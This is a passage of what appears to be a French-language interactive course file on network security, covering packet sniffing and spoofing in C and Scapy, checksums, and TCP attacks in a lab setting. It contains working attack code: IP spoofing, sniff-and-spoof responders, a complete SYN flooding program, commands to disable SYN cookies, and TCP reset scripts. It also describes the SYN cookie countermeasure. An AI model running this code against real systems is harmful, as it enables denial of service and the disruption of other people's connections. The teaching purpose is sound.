temp  = 0;\n    while(nleft > 1) { sum += *w++; nleft -= 2; }\n    if(nleft == 1) { *(u_char*)(&temp) = *(u_char*)w; sum += temp; }\n    sum  = (sum >> 16) + (sum & 0xffff);\n    sum += (sum >> 16);\n    return (unsigned short)(~sum);\n}\n\nint main() {\n    char buffer[1500];\n    memset(buffer, 0, sizeof(buffer));\n    \n    /* ====== Étape 1 : Remplir l'en-tête ICMP ====== */\n    struct icmpheader *icmp =\n        (struct icmpheader *)(buffer + sizeof(struct ipheader));\n    icmp->icmp_type   = 8;  // 8 = Echo Request (\"ping\")\n    icmp->icmp_code   = 0;\n    icmp->icmp_id     = htons(1234);\n    icmp->icmp_seq    = htons(1);\n    // Le checksum DOIT être calculé après avoir rempli tous les champs ICMP\n    icmp->icmp_chksum = in_cksum((unsigned short*)icmp,\n                                  sizeof(struct icmpheader));\n    \n    /* ====== Étape 2 : Remplir l'en-tête IP ====== */\n    struct ipheader *ip = (struct ipheader *)buffer;\n    ip->iph_ver      = 4;           // IPv4\n    ip->iph_ihl      = 5;           // En-tête de 5 × 4 = 20 octets\n    ip->iph_ttl      = 64;          // Time To Live\n    ip->iph_protocol = IPPROTO_ICMP; // Protocole : ICMP\n    // Adresse SOURCE FALSIFIÉE — n'appartient pas à cet ordinateur !\n    ip->iph_sourceip.s_addr = inet_addr(\"1.2.3.4\");\n    // Adresse destination réelle\n    ip->iph_destip.s_addr   = inet_addr(\"10.0.2.69\");\n    ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader));\n    \n    /* ====== Étape 3 : Envoyer le paquet ====== */\n    send_raw_ip_packet(ip);\n    return 0;\n}\n// Résultat : la machine 10.0.2.69 reçoit un ICMP Echo Request\n// depuis 1.2.3.4 (adresse jamais attribuée à cet ordinateur !)</pre></div>\n\n<h3 class=\"sub\">15.3.4 Spoofing UDP</h3>\n<div class=\"prose\">\n<p>Même principe pour UDP. L'en-tête UDP (8 octets) contient : port source, port destination, longueur totale, checksum. La construction est similaire à ICMP mais nécessite de remplir aussi les données (payload).</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Structure de l'en-tête UDP</div>\n<pre>struct udpheader {\n    unsigned short udp_sport; // Port source (falsifié !)\n    unsigned short udp_dport; // Port destination\n    unsigned short udp_ulen;  // Longueur (en-tête UDP + données)\n    unsigned short udp_sum;   // Checksum (peut être 0 pour UDP)\n};\n\n// Le checksum UDP est optionnel dans IPv4 (peut être 0).\n// Mais le checksum TCP est OBLIGATOIRE.</pre></div>\n"},
    {id:"s15_ss",short:"15.4 Sniff + Spoof",title:"15.4 Capture puis Falsification (Sniff+Spoof)",content:"\n<div class=\"prose\">\n<p>En combinant le sniffing et le spoofing, on peut <strong>surveiller le trafic réseau</strong> et <strong>injecter des réponses falsifiées</strong> en temps réel. C'est la technique de base derrière de nombreuses attaques :</p>\n<ul>\n<li>Empoisonnement du cache DNS</li>\n<li>Attaque man-in-the-middle</li>\n<li>Détournement de session TCP</li>\n</ul>\n</div>\n\n<div class=\"diagram\">\n<div class=\"diagram-title\">Sniff + Spoof : l'attaquant intercepte et répond à la place du serveur</div>\n<div style=\"display:grid;grid-template-columns:1fr auto 1fr;gap:10px;align-items:center;text-align:center\">\n  <div class=\"diag-node\">Client (10.0.2.68)</div>\n  <div class=\"diag-node attacker\">Attaquant (10.0.2.70)<br><small>écoute + répond</small></div>\n  <div class=\"diag-node server\">Serveur (10.0.2.69)<br><small>ne répond jamais</small></div>\n</div>\n<div style=\"margin-top:10px;font-family:monospace;font-size:.78rem;color:var(--muted)\">\n<div style=\"color:var(--accent)\">1. Client → broadcast UDP \"Bonjour port 9999\"</div>\n<div style=\"color:var(--red)\">2. Attaquant capture le paquet (pcap + mode promiscuous)</div>\n<div style=\"color:var(--red)\">3. Attaquant forge réponse avec IP source = 10.0.2.69 (serveur réel)</div>\n<div style=\"color:var(--green)\">4. Client reçoit réponse falsifiée, croit que c'est le vrai serveur</div>\n</div>\n</div>\n\n<div class=\"code-block\"><div class=\"code-label\">Sniff + Spoof UDP complet (sniff_spoof_udp.c)</div>\n<pre>#include &lt;pcap.h&gt;\n// ... inclure les structures ipheader, udpheader, etc.\n\nvoid spoof_reply(struct ipheader *ip) {\n    int ip_header_len = ip->iph_ihl * 4;\n    struct udpheader *udp = (struct udpheader *)((u_char *)ip + ip_header_len);\n    \n    // Ne traiter que les paquets sur le port 9999\n    if(ntohs(udp->udp_dport) != 9999) return;\n    \n    /* Étape 1 : Copier le paquet original dans un buffer de travail */\n    char buffer[1500];\n    memcpy(buffer, ip, ntohs(ip->iph_len));\n    struct ipheader  *newip  = (struct ipheader *)buffer;\n    struct udpheader *newudp = (struct udpheader *)(buffer + ip_header_len);\n    char             *data   = (char *)newudp + sizeof(struct udpheader);\n    \n    /* Étape 2 : Remplir le nouveau payload (données de la réponse) */\n    const char *msg = \"Ceci est une reponse falsifiee !\\n\";\n    strncpy(data, msg, strlen(msg));\n    \n    /* Étape 3 : En-tête UDP — inverser source et destination */\n    newudp->udp_sport = udp->udp_dport;   // Port source = 9999\n    newudp->udp_dport = udp->udp_sport;   // Port dest = port du client\n    newudp->udp_ulen  = htons(sizeof(struct udpheader) + strlen(msg));\n    newudp->udp_sum   = 0;                 // Checksum optionnel UDP\n    \n    /* Étape 4 : En-tête IP — inverser source et destination */\n    newip->iph_sourceip = ip->iph_destip; // IP source = IP du serveur réel\n    newip->iph_destip   = ip->iph_sourceip;\n    newip->iph_len      = htons(ip_header_len +\n                                sizeof(struct udpheader) + strlen(msg));\n    \n    /* Étape 5 : Envoyer le paquet falsifié */\n    send_raw_ip_packet(newip);\n}\n\nvoid got_packet(u_char *args, const struct pcap_pkthdr *header,\n                const u_char *packet) {\n    struct ethheader *eth = (struct ethheader *)packet;\n    if(ntohs(eth->ether_type) == 0x0800) { // Paquet IP\n        struct ipheader *ip = (struct ipheader *)(\n            packet + sizeof(struct ethheader));\n        if(ip->iph_protocol == IPPROTO_UDP)\n            spoof_reply(ip); // Traiter chaque paquet UDP\n    }\n}\n\nint main() {\n    pcap_t *handle;\n    char    errbuf[PCAP_ERRBUF_SIZE];\n    struct  bpf_program fp;\n    char    filter[] = \"udp and dst port 9999\";\n    \n    handle = pcap_open_live(\"enp0s3\", BUFSIZ, 1, 1000, errbuf);\n    pcap_compile(handle, &fp, filter, 0, 0);\n    pcap_setfilter(handle, &fp);\n    pcap_loop(handle, -1, got_packet, NULL);\n    return 0;\n}</pre></div>\n\n<div class=\"info-box ok\"><div class=\"ib-title\">Résultat de l'expérience</div>\n<pre>--- Sur le client ---\nseed@Client$ nc -u 10.0.2.69 9999\ntest_message\nCeci est une reponse falsifiee !    ← Reçu de l'attaquant, PAS du serveur !</pre>\n<p>Le client envoie un message au serveur, mais c'est l'attaquant qui répond — en se faisant passer pour le serveur. Le serveur ne reçoit rien (ou si il reçoit la requête, sa vraie réponse est ignorée parce que l'attaquant est plus rapide).</p></div>\n"},
    {id:"s15_scapy",short:"15.5 Python Scapy",title:"15.5 Sniffing et Spoofing avec Python et Scapy",content:"\n<div class=\"prose\">\n<p><strong>Scapy</strong> est une bibliothèque Python puissante pour la manipulation de paquets réseau. Elle est beaucoup plus simple à utiliser que le C, bien qu'environ <strong>37× plus lente</strong> (106 paquets/s vs 4000 paquets/s en C).</p>\n<p>Scapy permet de créer, envoyer, capturer et analyser des paquets de nombreux protocoles (Ethernet, IP, TCP, UDP, ICMP, DNS, ARP, BGP, etc.).</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Installation et premier test Scapy</div>\n<pre># Installation :\nsudo pip3 install scapy\n# ou : sudo apt-get install python3-scapy\n\n# Test rapide — Créer un paquet ICMP :\nfrom scapy.all import *\npkt = IP(dst=\"8.8.8.8\")/ICMP()  # Slash = empilement des couches !\npkt.show()                        # Afficher le paquet\nhexdump(pkt)                      # Affichage hexadécimal</pre></div>\n\n<h3 class=\"sub\">15.5.3 Sniffing avec Scapy</h3>\n<div class=\"code-block\"><div class=\"code-label\">Sniffer en 4 lignes avec Scapy</div>\n<pre>from scapy.all import *\n\ndef analyze_pkt(pkt):\n    if IP in pkt:\n        print(f\"Protocole : {pkt[IP].proto}\")\n        print(f\"Src : {pkt[IP].src}  →  Dst : {pkt[IP].dst}\")\n        if TCP in pkt:\n            print(f\"  TCP  port src={pkt[TCP].sport}  dst={pkt[TCP].dport}\")\n        elif UDP in pkt:\n            print(f\"  UDP  port src={pkt[UDP].sport}  dst={pkt[UDP].dport}\")\n        elif ICMP in pkt:\n            print(f\"  ICMP type={pkt[ICMP].type} code={pkt[ICMP].code}\")\n\n# Capturer les paquets ICMP (comme Wireshark mais en Python !)\nsniff(iface=\"enp0s3\", filter=\"icmp\", prn=analyze_pkt)\n# Capturer 10 paquets TCP port 80 et les sauvegarder :\npkts = sniff(filter=\"tcp port 80\", count=10)\nwrpcap(\"capture.pcap\", pkts) # Sauvegarder en format pcap</pre></div>\n\n<h3 class=\"sub\">15.5.4 Spoofing ICMP avec Scapy</h3>\n<div class=\"code-block\"><div class=\"code-label\">Envoyer un ICMP avec IP source falsifiée</div>\n<pre>from scapy.all import *\n\n# Construction par empilement de couches avec /\nip   = IP(src=\"1.2.3.4\",        # IP SOURCE FALSIFIÉE\n          dst=\"93.184.216.34\")  # IP destination (example.com)\nicmp = ICMP(type=8,     # 8 = Echo Request\n            id=1234,\n            seq=1)\ndata = b\"Payload ICMP\"   # Données optionnelles\npkt  = ip / icmp / data\n\npkt.show()      # Affiche le détail du paquet\nsend(pkt)       # Envoie le paquet (layer 3)\n# sendp(pkt)    # Envoie à la couche 2 (avec en-tête Ethernet)\n\n# flood() pour envoyer à grande vitesse :\nsend(IP(dst=\"10.0.2.69\")/ICMP(), count=100, inter=0.01)</pre></div>\n\n<h3 class=\"sub\">15.5.5 Spoofing UDP avec Scapy</h3>\n<div class=\"code-block\"><div class=\"code-label\">Envoyer UDP avec adresse source falsifiée</div>\n<pre>from scapy.all import *\nip   = IP(src=\"10.0.2.100\",  # Fausse adresse source\n          dst=\"10.0.2.69\")\nudp  = UDP(sport=8888, dport=9090)\npayload = b\"Hello Server!\"\npkt = ip / udp / payload\nsend(pkt, verbose=0)  # verbose=0 pour pas d'affichage</pre></div>\n\n<h3 class=\"sub\">15.5.6 Sniff + Spoof ICMP avec Scapy</h3>\n<div class=\"code-block\"><div class=\"code-label\">Répondre automatiquement aux pings sans serveur réel</div>\n<pre>from scapy.all import *\n\ndef spoof_ping_reply(pkt):\n    # Répond à tout ping destiné à une IP inexistante\n    if ICMP in pkt and pkt[ICMP].type == 8:  # Echo Request\n        # Construire Echo Reply avec IP source/dest interverties\n        ip   = IP(src=pkt[IP].dst, dst=pkt[IP].src)\n        icmp = ICMP(type=0,               # 0 = Echo Reply\n                    id=pkt[ICMP].id,      # MÊME id que la requête\n                    seq=pkt[ICMP].seq)    # MÊME séquence\n        if Raw in pkt:\n            data = pkt[Raw].load          # Renvoyer les mêmes données\n        else:\n            data = b\"\"\n        newpkt = ip / icmp / data\n        send(newpkt, verbose=0)\n        print(f\"  Répondu au ping de {pkt[IP].src} pour {pkt[IP].dst}\")\n\n# Écouter les pings destinés à 10.0.2.200 (machine inexistante)\nsniff(filter=\"icmp and host 10.0.2.200\", prn=spoof_ping_reply)\n\n# Test depuis un autre terminal :\n# ping 10.0.2.200  ← Devrait échouer normalement, mais...\n# ... l'attaquant répond ! On voit des réponses même si 10.0.2.200 n'existe pas</pre></div>\n"},
    {id:"s15_adv",short:"15.6-9 Hybride/Endian",title:"15.6-9 Hybride C+Scapy, Endianness, Checksum",content:"\n<h3 class=\"sub\">15.6 Approche Hybride C + Scapy (pour les attaques rapides)</h3>\n<div class=\"prose\">\n<p>Scapy est pratique mais lent (106 paquets/s). Pour les attaques nécessitant de la vitesse (ex. Attaque de Kaminsky sur DNS, SYN Flooding),le C est 37× plus rapide (4000 paquets/s).</p>\n<p><strong>Approche hybride recommandée :</strong></p>\n<ol>\n<li>Utiliser Scapy pour construire un paquet modèle et le sauvegarder dans un fichier binaire (<code>.bin</code>)</li>\n<li>Charger ce fichier dans un programme C</li>\n<li>Modifier à la volée uniquement les champs variables (IP source, numéro de port, transaction ID…)</li>\n<li>Envoyer à grande vitesse</li>\n</ol>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Étape 1 — Créer le template avec Scapy</div>\n<pre>from scapy.all import *\n\n# Construire un paquet UDP template (valeurs initiales arbitraires)\nip  = IP(src=\"0.0.0.0\", dst='10.0.2.69', chksum=0)\nudp = UDP(sport=0, dport=53, chksum=0)\npkt = ip / udp\n\n# Sauvegarder en binaire\nwith open('template_udp.bin', 'wb') as f:\n    f.write(bytes(pkt))\n    \nprint(f\"Template de {len(bytes(pkt))} octets sauvegardé\")</pre></div>\n<div class=\"code-block\"><div class=\"code-label\">Étape 2 — Modifier et envoyer rapidement en C</div>\n<pre>// Charger le template\nFILE *f = fopen(\"template_udp.bin\", \"rb\");\nfread(packet_buffer, 1, sizeof(packet_buffer), f);\nfclose(f);\n\n// Boucle d'envoi à grande vitesse\nfor(int i = 0; i &lt; 100000; i++) {\n    // Modifier l'IP source (offset 12 dans l'en-tête IP)\n    unsigned int rand_src = (unsigned int)rand();\n    memcpy(packet_buffer + 12, &rand_src, 4);\n    \n    // Modifier le port source UDP (offset 20+0 = 20)\n    unsigned short rand_port = htons((unsigned short)rand());\n    memcpy(packet_buffer + 20, &rand_port, 2);\n    \n    // Envoyer sans recalculer le checksum (chksum=0 = ignoré)\n    send_packet_raw(sock, packet_buffer, packet_len);\n}\n// Vitesse mesurée : ~4000 paquets/sec vs 106 paquets/sec avec Scapy</pre></div>\n\n<h3 class=\"sub\">15.7 Endianness — L'ordre des octets</h3>\n<div class=\"prose\">\n<p>L'<strong>endianness</strong> est l'ordre dans lequel les octets d'une valeur multi-octets sont stockés en mémoire.</p>\n<ul>\n<li><strong>Big-Endian</strong> : l'octet le plus significatif (MSB) est stocké en premier (à l'adresse mémoire la plus basse). Utilisé par IBM mainframes, réseaux IP.</li>\n<li><strong>Little-Endian</strong> : l'octet le moins significatif (LSB) est stocké en premier. Utilisé par les processeurs x86/x64 (Intel/AMD) et ARM.</li>\n</ul>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Représentation du nombre 0x01020304 (16909060 décimal) en mémoire</div>\n<table class=\"dt\">\n<tr><th>Adresse mémoire</th><th>Big-Endian (réseau)</th><th>Little-Endian (x86)</th></tr>\n<tr><td>0x00 (premier octet)</td><td>0x01 (MSB - le plus fort)</td><td>0x04 (LSB - le plus faible)</td></tr>\n<tr><td>0x01</td><td>0x02</td><td>0x03</td></tr>\n<tr><td>0x02</td><td>0x03</td><td>0x02</td></tr>\n<tr><td>0x03 (dernier octet)</td><td>0x04 (LSB - le plus faible)</td><td>0x01 (MSB - le plus fort)</td></tr>\n</table></div>\n<div class=\"code-block\"><div class=\"code-label\">Fonctions de conversion hôte ↔ réseau</div>\n<pre>// RÈGLE : toujours convertir lors de l'écriture dans un en-tête réseau !\n\n// Entier 16 bits (short = port TCP/UDP)\nport = htons(9090);   // Host-TO-Network Short : x86(0x2382) → réseau(0x8223)\nport = ntohs(pkt_port);  // Network-TO-Host Short\n\n// Entier 32 bits (IP, numéro de séquence TCP, etc.)\nip   = htonl(0x0a0002fe); // Host-TO-Network Long  = 10.0.2.254\nip   = ntohl(pkt_ip);     // Network-TO-Host Long\n\n// Exemple pratique (piège courant) :\nip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader));\n//           ^^^^^^^ OBLIGATOIRE car iph_len est stocké en Big-Endian\n\ntcp->tcp_sport = htons(1234); // Port source en Big-Endian réseau</pre></div>\n\n<h3 class=\"sub\">15.8 Calcul du Checksum — RFC 1071</h3>\n<div class=\"prose\">\n<p>Chaque en-tête IP, TCP, ICMP possède un champ <strong>checksum</strong> qui permet au récepteur de détecter les erreurs de transmission. Le checksum est le <strong>complément à 1 sur 16 bits</strong> de la somme des mots de 16 bits de l'en-tête.</p>\n<p>Pour TCP et UDP, le checksum est calculé sur un <strong>pseudo-en-tête</strong> qui inclut des champs de l'en-tête IP (adresses source/destination) pour parer aux paquets reacheminés.</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Implémentation standard in_cksum() (RFC 1071)</div>\n<pre>unsigned short in_cksum(unsigned short *buf, int length) {\n    unsigned short *w    = buf;\n    int            nleft = length;\n    int            sum   = 0;\n    unsigned short temp  = 0;\n    \n    /* Accumuler des mots de 16 bits */\n    while(nleft > 1) {\n        sum   += *w++;\n        nleft -= 2;\n    }\n    \n    /* Gérer le dernier octet si longueur impaire */\n    if(nleft == 1) {\n        *(u_char*)(&temp) = *(u_char*)w;\n        sum += temp;\n    }\n    \n    /* Replier les retenues sur 16 bits */\n    sum  = (sum >> 16) + (sum & 0xffff);\n    sum += (sum >> 16);     // Ajouter une dernière retenue possible\n    \n    return (unsigned short)(~sum); // Complément à 1\n}\n\n// Utilisation :\nicmp->icmp_chksum = in_cksum((unsigned short *)icmp,\n                               sizeof(struct icmpheader));\n// Pour TCP : utiliser un pseudo-en-tête incluant IP source/dest, proto, longueur</pre></div>\n"}
]};
const ch16={id:"ch16",num:16,icon:"\u2694\ufe0f",title:"Attaques sur le Protocole TCP",desc:"SYN Flooding (DoS), TCP Reset (coupure de connexion) et Session Hijacking (injection de commandes). Implémentation, contre-mesures, reverse shell.",sections:[
    {id:"s16_tcp",short:"16.1 Fonctionnement TCP",title:"16.1 Comment fonctionne TCP",content:"\n<div class=\"prose\">\n<p>Le protocole TCP (Transmission Control Protocol) est un protocole de transport <strong>fiable et orienté connexion</strong>. Contrairement à UDP, TCP garantit que les données arrivent dans l'ordre, sans duplication, et sans perte. Il détecte et retransmet les segments perdus.</p>\n<p>TCP est utilisé par HTTP/HTTPS, SSH, FTP, SMTP, et la majorité des applications réseau. Pour fonctionner, deux hôtes doivent d'abord établir une <strong>connexion logique</strong> (pas physique), identifiée par 4 champs :</p>\n</div>\n<table class=\"dt\">\n<tr><th colspan=\"2\">Identifiant d'une connexion TCP (4-tuple)</th></tr>\n<tr><td>Adresse IP source</td><td>IP de la machine qui initie la connexion</td></tr>\n<tr><td>Port source</td><td>Port choisi aléatoirement par le client (0-65535)</td></tr>\n<tr><td>Adresse IP destination</td><td>IP du serveur</td></tr>\n<tr><td>Port destination</td><td>Port du service (22=SSH, 23=Telnet, 80=HTTP)</td></tr>\n</table>\n<div class=\"prose\">\n<h3 class=\"sub\">En-tête TCP — Les champs essentiels pour la sécurité</h3>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Structure de l'en-tête TCP (20 octets minimum)</div>\n<pre>struct tcpheader {\n    unsigned short tcp_sport;   // Port source (16 bits)\n    unsigned short tcp_dport;   // Port destination (16 bits)\n    unsigned int   tcp_seq;     // Numéro de séquence (32 bits)\n                                // = position du 1er octet de ce segment\n    unsigned int   tcp_ack;     // Numéro d'acquittement (32 bits)\n                                // = prochain numéro de séquence attendu\n    unsigned char  tcp_offx2;   // Longueur en-tête (4 bits) + réservé\n    unsigned char  tcp_flags;   // Bits de contrôle (6 bits utilisés)\n                                // TH_FIN=0x01, TH_SYN=0x02, TH_RST=0x04\n                                // TH_PUSH=0x08,TH_ACK=0x10,TH_URG=0x20\n    unsigned short tcp_win;     // Taille de fenêtre (contrôle de flux)\n    unsigned short tcp_sum;     // Checksum (OBLIGATOIRE pour TCP)\n    unsigned short tcp_urp;     // Pointeur urgent\n};</pre></div>\n\n<h3 class=\"sub\">Transmission des données TCP</h3>\n<div class=\"prose\">\n<p>TCP assure la fiabilité via des <strong>numéros de séquence</strong> : chaque octet dans le flux a un numéro unique. L'émetteur stocke les données dans un <strong>tampon d'envoi</strong>, les envoie par segments, et attend un acquittement (ACK). Si l'ACK n'arrive pas avant le timeout, il retransmet.</p>\n<p>Le récepteur utilise les numéros de séquence pour <strong>réordonner</strong> les segments arrivés dans le désordre et <strong>détecter les duplicats</strong>. La <strong>fenêtre glissante</strong> (sliding window) contrôle le flux : elle indique combien d'octets le récepteur peut encore recevoir dans son tampon.</p>\n</div>\n"},
    {id:"s16_syn",short:"16.2 SYN Flooding",title:"16.2 Attaque SYN Flooding",content:"\n<div class=\"diagram\">\n<div class=\"diagram-title\">Le 3-Way Handshake TCP — Établissement de connexion</div>\n<div class=\"diag-seq\">\n  <div class=\"step-left\">Client (10.0.2.68)</div>\n  <div></div>\n  <div class=\"step-right\">Serveur (10.0.2.69)</div>\n  \n  <div class=\"step-left\">SYN, seq=x (aléatoire)</div>\n  <div class=\"step-arrow-r\">——————————→</div>\n  <div class=\"step-right\" style=\"opacity:.4\">...</div>\n  <div class=\"step-desc\">Étape 1 : Le client envoie SYN avec numéro de séquence x aléatoire.<br>Le serveur alloue un TCB, met la connexion en file half-open.</div>\n\n  <div class=\"step-left\" style=\"opacity:.4\">...</div>\n  <div class=\"step-arrow-l\">←——————————</div>\n  <div class=\"step-right\">SYN-ACK, seq=y, ack=x+1</div>\n  <div class=\"step-desc\">Étape 2 : Le serveur répond avec son propre séquence y, ACK=x+1.</div>\n\n  <div class=\"step-left\">ACK, ack=y+1</div>\n  <div class=\"step-arrow-r\">——————————→</div>\n  <div class=\"step-right\" style=\"opacity:.4\">...</div>\n  <div class=\"step-desc\">Étape 3 : Le client confirme. Connexion ÉTABLIE des deux côtés.</div>\n</div>\n</div>\n\n<h3 class=\"sub\">La file des connexions semi-ouvertes</h3>\n<div class=\"prose\">\n<p>Après avoir reçu le SYN (étape 1), le serveur alloue une structure <strong>TCB (Transmission Control Block)</strong> et la place dans une <strong>file des connexions semi-ouvertes (half-open queue)</strong>. À l'étape 3, quand le ACK final arrive, le TCB passe dans la file des connexions complètes — l'application peut alors <code>accept()</code> la connexion.</p>\n<p>Si l'étape 3 n'arrive jamais, le TCB reste dans la file pendant environ <strong>75 secondes</strong> (Linux) avant d'expirer. Cette file a une <strong>capacité fixe et limitée</strong> — c'est la cible de l'attaque SYN Flooding.</p>\n</div>\n\n<h3 class=\"sub\">16.2.2 L'attaque SYN Flooding — Principe</h3>\n<div class=\"prose\">\n<p>L'attaquant envoie des milliers de paquets SYN avec des <strong>adresses IP sources aléatoires (falsifiées)</strong>. Pour chacun :</p>\n<ol>\n<li>Le serveur alloue un TCB dans la file half-open</li>\n<li>Le serveur envoie un SYN+ACK vers l'IP falsifiée</li>\n<li>L'IP falsifiée n'existe pas → le SYN+ACK disparaît dans le vide</li>\n<li>Le TCB reste bloqué dans la file pendant 75s</li>\n</ol>\n<p>En remplissant rapidement toute la file, le serveur ne peut plus accepter de <em>vraies</em> connexions → <strong>Déni de Service (DoS)</strong>.</p>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">SYN Flooding — La file half-open déborde</div>\n<div class=\"diag-flow\" style=\"flex-direction:column\">\n  <div style=\"display:flex;gap:8px;align-items:center\">\n    <div class=\"diag-node attacker\">Attaquant<br>IP: 10.0.2.70</div>\n    <div class=\"diag-arrow\" style=\"flex:1;text-align:center;font-size:.75rem;color:var(--red)\">\n      ——— SYN (IP src=1.2.3.4) ———→<br>\n      ——— SYN (IP src=5.6.7.8) ———→<br>\n      ——— SYN (IP src=9.10.11.12) →<br>\n      ——— SYN (IP src=...) ———→<br>\n      <span style=\"color:var(--muted)\">x1000/seconde</span>\n    </div>\n    <div class=\"diag-node server\">Serveur<br>10.0.2.69<br><span style=\"color:var(--red);font-size:.7rem\">File pleine !</span></div>\n  </div>\n  <div style=\"display:flex;gap:8px;align-items:center;opacity:.4\">\n    <div class=\"diag-node\">Vrai Client</div>\n    <div style=\"flex:1;text-align:center;color:var(--red);font-size:.8rem\">——— SYN ———→ REJETÉ ! File pleine</div>\n    <div class=\"diag-node server\">Serveur</div>\n  </div>\n</div></div>\n<div class=\"code-block\"><div class=\"code-label\">Désactiver les SYN cookies puis lancer l'attaque</div>\n<pre># Désactiver les SYN cookies (contre-mesure par défaut) :\nsudo sysctl -w net.ipv4.tcp_syncookies=0\n\n# Attaque avec l'outil Netwox (tool 76) sur le port telnet (23) :\nsudo netwox 76 -i 10.0.2.69 -p 23 -s raw\n\n# Vérifier les connexions semi-ouvertes sur le serveur :\nnetstat -tna | grep SYN_RECV\n# Si l'attaque réussit, vous verrez des centaines de lignes SYN_RECV</pre></div>\n<div class=\"code-block\"><div class=\"code-label\">Implémentation de l'attaque en C (tcp_syn_flooding.c)</div>\n<pre>#define DEST_IP   \"10.0.2.69\"\n#define DEST_PORT 80       // Attaquer le serveur web\n#define PACKET_LEN 1500\n\nvoid send_raw_ip_packet(struct ipheader *ip); // définie ailleurs\n\nint main() {\n    char     buffer[PACKET_LEN];\n    struct ipheader  *ip  = (struct ipheader  *)buffer;\n    struct tcpheader *tcp = (struct tcpheader *)(buffer +\n                             sizeof(struct ipheader));\n    \n    srand(time(NULL));\n    \n    while(1) {\n        // Remplir l'en-tête TCP : chaque paquet est différent\n        memset(tcp, 0, sizeof(struct tcpheader));\n        tcp->tcp_sport = rand();            // Port source ALÉATOIRE\n        tcp->tcp_dport = htons(DEST_PORT);  // Port cible\n        tcp->tcp_seq   = rand();            // Numéro de séquence ALÉATOIRE\n        tcp->tcp_offx2 = 0x50;             // En-tête = 5 × 4 = 20 octets\n        tcp->tcp_flags = TH_SYN;            // SEUL le bit SYN est activé\n        tcp->tcp_win   = htons(65535);      // Fenêtre maximale\n        // Checksum TCP (utilise pseudo-en-tête IP)\n        tcp->tcp_sum   = calculate_tcp_checksum(ip);\n        \n        // Remplir l'en-tête IP\n        memset(ip, 0, sizeof(struct ipheader));\n        ip->iph_ver      = 4;\n        ip->iph_ihl      = 5;\n        ip->iph_ttl      = 64;\n        ip->iph_protocol = IPPROTO_TCP;\n        // IP SOURCE ENTIÈREMENT ALÉATOIRE (falsifiée)\n        ip->iph_sourceip.s_addr = rand();\n        ip->iph_destip.s_addr   = inet_addr(DEST_IP);\n        ip->iph_len = htons(sizeof(struct ipheader) +\n                            sizeof(struct tcpheader));\n        \n        send_raw_ip_packet(ip); // Envoyer !\n    }\n    return 0;\n}\n// Pourquoi pas Scapy ? Trop lent. L'attaque doit être plus rapide\n// que les paquets RST des \"vraies\" machines avec les IPs aléatoires.</pre></div>\n\n<div class=\"info-box note\"><div class=\"ib-title\">Contre-mesure : SYN Cookies (RFC 4987)</div>\n<p>Inventés par Daniel J. Bernstein (1996). Idée : <strong>ne pas allouer de ressources après un SYN</strong>. À la place, le serveur encode les paramètres de connexion (IP/port client, timestamp, MSS) dans son numéro de séquence initial via une fonction de hachage cryptographique.</p>\n<p>Quand le client légitime renvoie l'ACK (ack = cookie+1), le serveur <em>recalcule</em> le hash et vérifie que l'ACK est cohérent. Un attaquant avec une fausse IP ne peut jamais compléter cette étape → les faux SYN ne consomment aucune ressource côté serveur.</p>\n<div class=\"code-block\"><div class=\"code-label\">Activer/désactiver les SYN cookies sous Linux</div>\n<pre>sudo sysctl -w net.ipv4.tcp_syncookies=1  # Activer (par défaut Ubuntu)\nsudo sysctl -w net.ipv4.tcp_syncookies=0  # Désactiver (pour l'expérience)\n# Vérifier l'état actuel :\nsysctl net.ipv4.tcp_syncookies</pre></div></div>\n"},
    {id:"s16_reset",short:"16.3 TCP Reset",title:"16.3 Attaque TCP Reset",content:"\n<div class=\"prose\">\n<p>L'attaque <strong>TCP Reset</strong> force la fermeture brutale d'une connexion TCP existante. Un seul paquet RST bien formé suffit à <strong>couper immédiatement</strong> une session en cours.</p>\n<p>Comparaison avec la fermeture normale :</p>\n<ul>\n<li><strong>Fermeture normale (FIN)</strong> : échange FIN/ACK des deux côtés — \"fermeture polie\", ordonnée</li>\n<li><strong>Reset (RST)</strong> : une extrémité envoie RST → connexion close immédiatement, buffers vidés</li>\n</ul>\n</div>\n\n<h3 class=\"sub\">Conditions pour qu'un RST soit accepté</h3>\n<div class=\"prose\">\n<p>Pour que le récepteur accepte un paquet RST, la <strong>signature de la session (4-tuple IP+port)</strong> doit correspondre exactement, ET le <strong>numéro de séquence</strong> doit être dans la fenêtre de réception du récepteur.</p>\n<p>En pratique sur Linux, l'implémentation est plus stricte : le numéro de séquence RST doit correspondre <em>exactement</em> au prochain numéro attendu.</p>\n</div>\n\n<div class=\"code-block\"><div class=\"code-label\">TCP Reset manuel avec Wireshark + Scapy</div>\n<pre># Étape 1 : Dans Wireshark, observer une session telnet active\n# On voit un paquet TCP du serveur (10.0.2.69:23) vers le client (10.0.2.68:X)\n# avec seq=2737422033 et ack=...\n\n# Étape 2 : Forger un paquet RST en se faisant passer pour le serveur\nfrom scapy.all import *\n\n# Infos récupérées dans Wireshark :\n# Le client 10.0.2.68 attend seq=2737422033 de la part du serveur\nip  = IP(src=\"10.0.2.69\",  # Se faire passer pour le serveur\n         dst=\"10.0.2.68\")  # Envoyer au client\ntcp = TCP(sport=23,           # Port telnet source\n          dport=45634,        # Port aléatoire du client\n          flags=\"R\",          # R = RST\n          seq=2737422033)     # Numéro de séquence attendu par le client !\n\npkt = ip / tcp\nsend(pkt, verbose=0)\n# Résultat sur le client : \"Connection closed by foreign host\"</pre></div>\n\n<h3 class=\"sub\">Reset automatique (streaming vidéo)</h3>\n<div class=\"prose\">\n<p>Pour une connexion en streaming (ex. vidéo), le numéro de séquence change constamment et est impossible à lire manuellement. Il faut automatiser le sniff+spoof :</p>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Coupure automatique de tout flux TCP (reset_auto.py)</div>\n<pre>from scapy.all import *\n\ndef reset_connection(pkt):\n    # Pour chaque paquet TCP échangé, on envoie un RST\n    if TCP in pkt and pkt[TCP].flags & 0x02 == 0:  # Pas un SYN\n        ip  = IP(dst=pkt[IP].src,   src=pkt[IP].dst)\n        tcp = TCP(flags=\"R\",\n                  